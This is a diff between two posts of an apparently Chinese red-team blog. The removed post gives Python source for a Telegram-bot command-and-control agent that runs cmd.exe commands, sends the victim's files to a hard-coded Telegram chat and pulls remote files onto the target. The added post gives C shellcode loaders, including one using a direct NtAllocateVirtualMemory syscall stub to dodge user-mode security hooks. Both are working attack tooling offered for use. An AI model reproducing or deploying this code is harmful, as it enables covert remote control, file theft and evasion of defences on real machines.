@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Telegram做C2? | 九世的博客</title>
-  <meta name="keywords" content=" C2 ">
-  <meta name="description" content="Telegram做C2? | 九世的博客">
+  <title>syscall学习 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="syscall学习 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1943,9 +1943,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Telegram做C2" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-syscall学习" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Telegram做C2?</h1>
+        <h1 class="article-title">syscall学习</h1>
     
     <div class="article-meta">
         
@@ -1954,14 +1954,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">C2</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-20 21:04:23">2019-08-20 20:02</time>
+        创建时间:<time class="date" title="更新时间: 2022-04-09 02:51:09">2022-04-09 02:39</time>
         
     </div>
     <div class="article-meta">
@@ -1983,7 +1983,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选择环境"><span class="toc-text">选择环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#创建一个Bot"><span class="toc-text">创建一个Bot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写程序"><span class="toc-text">编写程序</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall和正常调用的区别"><span class="toc-text">syscall和正常调用的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小试牛刀"><span class="toc-text">小试牛刀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1998,120 +1998,138 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到某位师傅写了个Tg的C2，看起来不错打算自己也来操作一波</p>
-<p><img src="http://vpic.video.qq.com/3388556/d05581emq3x_ori_3.jpg" alt="img"></p>
-<p>单方面缺点：一个bot只能开一次，多开409（冲突）</p>
-<h2 id="选择环境"><a href="#选择环境" class="headerlink" title="选择环境"></a>选择环境</h2><p>Tg官方给出了很多语言的API模块，看你选择哪个</p>
-<p><a href="https://core.telegram.org/bots/samples" target="_blank" rel="noopener">Telegram Bots</a></p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mYl5nK.png" alt="image"></p>
-<p>我这里用的是python开发的，用的模块是</p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mYlI0O.png" alt="image"></p>
-<p>README.md给出的说明:<a href="https://github.com/eternnoir/pyTelegramBotAPI" target="_blank" rel="noopener">Telegram API-&gt;README.md</a></p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mY3EPH.png" alt="image"></p>
-<p>最后定下来的环境：</p>
-<pre><code>version:python3.7
-modules：requests,pyTelegramBotAPI
-os:windows
-</code></pre><p>c2针对的系统</p>
-<pre><code>os:windows
-</code></pre><h2 id="创建一个Bot"><a href="#创建一个Bot" class="headerlink" title="创建一个Bot"></a>创建一个Bot</h2><p>登录Tg</p>
-<blockquote>
-<p>访问<a href="https://telegram.me/botfather" target="_blank" rel="noopener">https://telegram.me/botfather</a></p>
-<p>添加BotFather为联系人(BotFather用来创建和管理自定义bot)</p>
-<p>发送/newbot,输入用户名和Bot的名称即可完成创建一个bot</p>
-</blockquote>
-<p><img src="https://wooyun.js.org/images_result/images/20160526155935581702-21.png" alt=""></p>
-<p>创建完成后，你会得到你新建bot的token</p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mY8apd.png" alt="N(%V~P0N$PW23(RF4VN6UL3"></p>
-<p>然后添加你新建的机器人，直接搜索添加就好</p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mY8r0f.png" alt="æ·»å ä½ çæºå¨äºº"></p>
-<h2 id="编写程序"><a href="#编写程序" class="headerlink" title="编写程序"></a>编写程序</h2><p>整体的交互流程如图：</p>
-<p>(画图较丑，见谅)</p>
-<p><img src="https://s2.ax1x.com/2019/08/20/mYG8vn.png" alt="image"></p>
-<p>首先tg的API模块给出了很多封装的函数（装饰器），用于处理接收、发送、文件上传、文件下载</p>
-<p>PS:建议看一下API文档在来看</p>
-<p>制定一条命令，当attack执行了该指令的时候执行对应的操作与处理无效指令</p>
-<pre><code class="python">import telebot
+        <p>好久没写博客了，工作和在学校的自由完全比不了。怀念初中的她怀念大学无拘无束的生活….<br>如今大家都各自毕业，今生能否相见仍成问题<br><img src="https://s1.ax1x.com/2022/04/09/LCzKZ6.jpg" alt=""></p>
+<h2 id="syscall和正常调用的区别"><a href="#syscall和正常调用的区别" class="headerlink" title="syscall和正常调用的区别"></a>syscall和正常调用的区别</h2><p>正常使用WIN API:ntdll-&gt;kernelBase.dll-&gt;kerlnel32.dll<br>SYSCALL:内核函数直接调用 (不会通过Loadlibrary+GetprocAddress调用下一级DLL的API函数，直接进行调用)</p>
+<p>下图可以更好的理解<br>正常API调用过程如下<br>（可以看到调用VirtualAlloc的流程是，Kernel32.dll!VirtualAlloc-&gt;KernelBase.dll!VirtualAllocEx-&gt;Ntdll!NtAllocateVirtualMemory）<br><img src="https://s1.ax1x.com/2022/04/09/LCzQIO.png" alt=""></p>
+<p>SYSCALL调用则不会有下级DLL加载调用API函数<br><img src="https://s1.ax1x.com/2022/04/09/LCz3Je.png" alt=""></p>
+<h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>这次主要将VirtualAlloc改成Syscall<br>（下图直接编译运行则和图一一样，调用下层DLL进行调用）<br>源代码：</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
 
-bot = telebot.TeleBot(&quot;TOKEN&quot;)
-@bot.message_handler(commands=[&#39;start&#39;, &#39;help&#39;])
-def send_welcome(message):
-    bot.reply_to(message, &quot;demo&quot;) #获取消息句柄，返回对应消息
-@bot.message_handler(func=lambda message: True)
-def echo_all(message):
-    bot.reply_to(message, message.text) #返回输入无效的指令
-bot.polling() #运行bot
+
+
+
+int main()
+{
+    unsigned char buf[] =
+            &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
+            &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
+            &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
+            &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
+            &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
+            &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
+            &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
+            &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
+            &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
+            &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
+            &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
+            &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
+            &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
+            &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
+            &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
+            &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
+            &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
+            &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
+            &quot;\x63\x2e\x65\x78\x65\x00&quot;;
+    size_t size = sizeof(buf);
+    void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (sc == NULL)
+    {
+        return 0;
+    }
+    memcpy(sc, buf, size);
+    (*(int(*)()) sc)();
+    return 0;
+}
 </code></pre>
-<p><img src="https://s2.ax1x.com/2019/08/20/mYJbl9.png" alt="image"></p>
-<p>然后构造各个指令对应的函数</p>
-<pre><code class="python">@bot.message_handler(commands=[&#39;help&#39;])
-def send_welcome(message):
-    bot.reply_to(message,&#39;/cmd [token] [command] -- 执行cmd命令\n/computer -- 查看主机信息\n/upload [token] [filepath] -- 上传机器的文件到tg\n/download [token] [fileptah] -- 下载远程文件到目标机器\n/help [token] -- 帮助信息&#39;)
-
-@bot.message_handler(commands=[&#39;computer&#39;])
-def commputer(message):
-    bot.reply_to(message,&#39;主机信息:&#39;)
-    jg=&#39;name:{} ID:{} {}&#39;.format(str(hostname).lstrip().rstrip().replace(&#39;\n&#39;,&#39;&#39;),LD[0],IPS[0])
-    bot.reply_to(message,jg)
-
-@bot.message_handler(regexp=&quot;[/]cmd [0-9-a-z]{32} .*&quot;) #当返回的内容正则能匹配成功后执行以下
-def handle_message(message):
-    command=str(message.text).replace(&#39;/cmd&#39;,&#39;&#39;).strip().lstrip()
-    ken=re.findall(&#39;[0-9-a-z]{32}&#39;,command)
-    if ken[0]==LD[0]:
-        commands=re.subn(&quot;[0-9-a-z]{32}&quot;,&quot;&quot;,command)
-        cmd=str(commands[0]).lstrip().rstrip()
-        jg=os.popen(&#39;cmd.exe /c {}&#39;.format(cmd)).read()
-        splitted_text=util.split_string(jg,3000)
-        for text in splitted_text:
-            bot.reply_to(message,text)
-
-@bot.message_handler(regexp=&quot;[/]upload [0-9-a-z]{32} .*&quot;)
-def upload(message):
-    command=str(message.text).replace(&#39;/upload&#39;,&#39;&#39;).strip().lstrip()
-    ken=re.findall(&#39;[0-9-a-z]{32}&#39;,command)
-    if ken[0]==LD[0]:
-        commands=re.subn(&quot;[0-9-a-z]{32}&quot;,&quot;&quot;,command)
-        path=str(commands[0]).lstrip().rstrip()
-        file_name=str(path).split(&#39;\\&#39;)[-1]
-        try:
-            file=open(path,&#39;rb&#39;)
-            bot.send_document(631202355,file,caption=file_name)
-        except:
-            pass
-            bot.send_message(631202355,&#39;没有:{}这个文件&#39;.format(path))
-
-@bot.message_handler(regexp=&quot;[/]download [0-9-a-z]{32} .*&quot;)
-def download(message):
-  command = str(message.text).replace(&#39;/download&#39;, &#39;&#39;).strip().lstrip()
-  ken = re.findall(&#39;[0-9-a-z]{32}&#39;, command)
-  if ken[0] == LD[0]:
-    url=re.subn(&quot;[0-9-a-z]{32}&quot;, &quot;&quot;, command)
-    try:
-        file_name=str(url[0].split(&#39;/&#39;)[-1])
-        dk=open(file_name,&#39;wb&#39;)
-        rqt=requests.get(url=str(url[0]).lstrip().rstrip(),headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39;},timeout=30)
-        print(rqt.status_code)
-        dk.write(rqt.content)
-        dk.close()
-        if os.path.exists(file_name):
-            bot.send_message(631202355,&#39;文件:{} download 成功!&#39;.format(file_name))
-        else:
-            bot.send_message(631202355, &#39;文件:{} download 失败!&#39;.format(file_name))
-    except Exception as r:
-        bot.send_message(631202355,&#39;Error:{}&#39;.format(r))
+<p>那么要怎么找到VirtualAlloc的底层API呢？通过API Monitor监视API。可以发现（也方便待会syscall照着修改代码）</p>
+<pre><code>* ntdll.dll中保存着执行功能的函数以及系统服务调用存根，ntdll.dll导出了Windows Native API，其具体实现其实在 ntoskrnl.exe 中
+</code></pre><p>利用windbg获取下层API的参数结构</p>
+<pre><code>x ntdll!NtAllocateVirtualMemory #从dll搜索API函数
+u &lt;address&gt; #查看地址对应的汇编
+</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzYQA.png" alt=""></p>
+<p>这段汇编可以理解为将rcx参数指针的值保存到r10，然后将系统调用号传入给eax。计算内存偏移地址里的值，根据标志寄存器的大小来决定是否要跳转到ntdll!NtAllocateVirtualMemory。最后syscall进入内核调用内核函数</p>
+<p>引用一张图<br><img src="https://s1.ax1x.com/2022/04/09/LCztsI.png" alt=""></p>
+<p>我们只需要取</p>
+<pre><code>mov     r10,rcx
+mov     eax,18h
+syscall
+ret
+</code></pre><p>然后丢进ASM，创建函数。在实例化调用即可<br>syscall.asm</p>
+<pre><code>.code
+NtAllocateVirtualMemory proc
+mov r10,rcx
+mov eax,18h
+syscall
+ret
+NtAllocateVirtualMemory endp
+end
+</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzNLt.png" alt=""></p>
+<p>设置ASM属性<br><img src="https://s1.ax1x.com/2022/04/09/LCzaeP.png" alt=""></p>
+<p>导出该函数</p>
+<pre><code>EXTERN_C  NTSTATUS NtAllocateVirtualMemory(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect
+);
+</code></pre><p>完整代码如下：<br>（NtAllocateVirtualMemory对着监视的API填就行了）</p>
+<pre><code class="C">// syscalltest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。
+//
+#include &lt;iostream&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+EXTERN_C  NTSTATUS NtAllocateVirtualMemory(
+    HANDLE    ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T   RegionSize,
+    ULONG     AllocationType,
+    ULONG     Protect
+);
+int main()
+{
+    unsigned char buf[] =
+        &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
+        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
+        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
+        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
+        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
+        &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
+        &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
+        &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
+        &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
+        &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
+        &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
+        &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
+        &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
+        &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
+        &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
+        &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
+        &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
+        &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
+        &quot;\x63\x2e\x65\x78\x65\x00&quot;;
+    size_t size = sizeof(buf);
+    void* sc = NULL;
+    NtAllocateVirtualMemory(GetCurrentProcess(), &amp;sc, 0,&amp;size,MEM_RESERVE |  MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (sc == NULL)
+    {
+        return 0;
+    }
+    memcpy(sc, buf, sizeof(buf));
+    (*(int(*)()) sc)();
+    return 0;
+}
 </code></pre>
-<p>这里对应指令</p>
-<pre><code>指令：/help,/cmd,/upload,/download,/computer
-</code></pre><p>PS：我原本打算用Tg控制多个bot的，所以写了生成token这个操作，后面发生409（请求冲突问题）。Google一堆也没解决方案，就没去改他了</p>
-<p>完整代码-&gt;仓库地址：<a href="[https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/tgc2](https://github.com/422926799/note/tree/master/自己写的工具/tgc2">Tg_C&amp;C</a>)</p>
-<p>测试结果：</p>
-<p><img src="https://camo.githubusercontent.com/eab6a226745b2c0eef020f6f936cf6ae9fcc54d2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d596b744a4f2e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183651"></p>
-<p><img src="https://camo.githubusercontent.com/2e28d621ecee1410f3e9d0ae13d924e27466bd0d/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d596b66796a2e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183708"></p>
-<p><img src="https://camo.githubusercontent.com/abd1c816a03d135fa6cbc3dbc7129dbf2ff74dc4/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59414558642e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183630"></p>
-<p><img src="https://camo.githubusercontent.com/faa7df5d3f6b29714d285ca6af8b2d2a293e8f14/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59414d68382e706e67" alt="QQÃ¥ï¿½Â¾Ã§ï¿½ï¿½20190820183643"></p>
-<p>GIF</p>
-<p><img src="https://camo.githubusercontent.com/e5f9d1c0f1ca03e0f58dd32022e8eeee1b738bd2/68747470733a2f2f73322e617831782e636f6d2f323031392f30382f32302f6d59566973482e676966" alt="GIF"></p>
+<p>生成依赖项勾上masm<br><img src="https://s1.ax1x.com/2022/04/09/LCzddf.png" alt=""><br><img src="https://s1.ax1x.com/2022/04/09/LCzwo8.png" alt=""></p>
+<p>注意事项：size传入NtAllocateVirtualMemory会被修改。不要在memcpy的时候重用 原因是内存在分配的时候会向上取整，比如：比如1500大小的，会分配个2000。重用size变量后会造成memcpy将shellcode拷贝到内存的时大小与数组不符，造成越界读到外边去了<br>造成shellcode运行失败<br><img src="https://s1.ax1x.com/2022/04/09/LCzrWQ.png" alt=""></p>
+<p>现成的一些生成syscall的工具，自动生成asm和c文件</p>
+<pre><code>Syswhispers2 与 Syswhispers 最大的不同在于 Syswhispers2 不再需要指定 Windows 版本，也不再依赖于以往的系统调用表，而是采用了系统调用地址排序的方法，也就是这篇 Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams。其具体含义是先解析 Ntdll.dll 的 导出地址表 EAT，定位所有以 “Zw” 开头的函数，将开头替换成 “Nt”，将 Code stub 的 hash 和地址存储在 SYSCALL_ENTRY 结构的表中，存储在表中的系统调用的索引是SSN（System Service Numbers，系统服务编号）。
+</code></pre><p><a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="noopener">https://github.com/jthuraisamy/SysWhispers2</a><br><img src="https://s1.ax1x.com/2022/04/09/LCzszj.png" alt=""></p>
+<p>将头文件、asm文件、syscall.c导入项目即可<br>syscall.c改为syscall.cpp引入syscall.h<br><img src="https://s1.ax1x.com/2022/04/09/LCzcyn.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/261582#h3-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/261582#h3-9</a><br><a href="https://www.ddosi.org/b302/" target="_blank" rel="noopener">https://www.ddosi.org/b302/</a><br><a href="https://cloud.tencent.com/developer/article/1922129" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1922129</a><br><a href="https://lengjibo.github.io/syscall/" target="_blank" rel="noopener">https://lengjibo.github.io/syscall/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2121,12 +2139,12 @@ def download(message):
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Telegram做C2?</p>
+    <p><span class="copy-title">文章标题:</span>syscall学习</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-20, 20:02:31</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-20, 21:04:23</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/da6d6ea3.html" title="Telegram做C2?">http://422926799.github.io/posts/da6d6ea3.html</a>
+    <p><span class="copy-title">发布时间:</span>2022-04-09, 02:39:56</p>
+    <p><span class="copy-title">最后更新:</span>2022-04-09, 02:51:09</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/87f73904.html" title="syscall学习">http://422926799.github.io/posts/87f73904.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
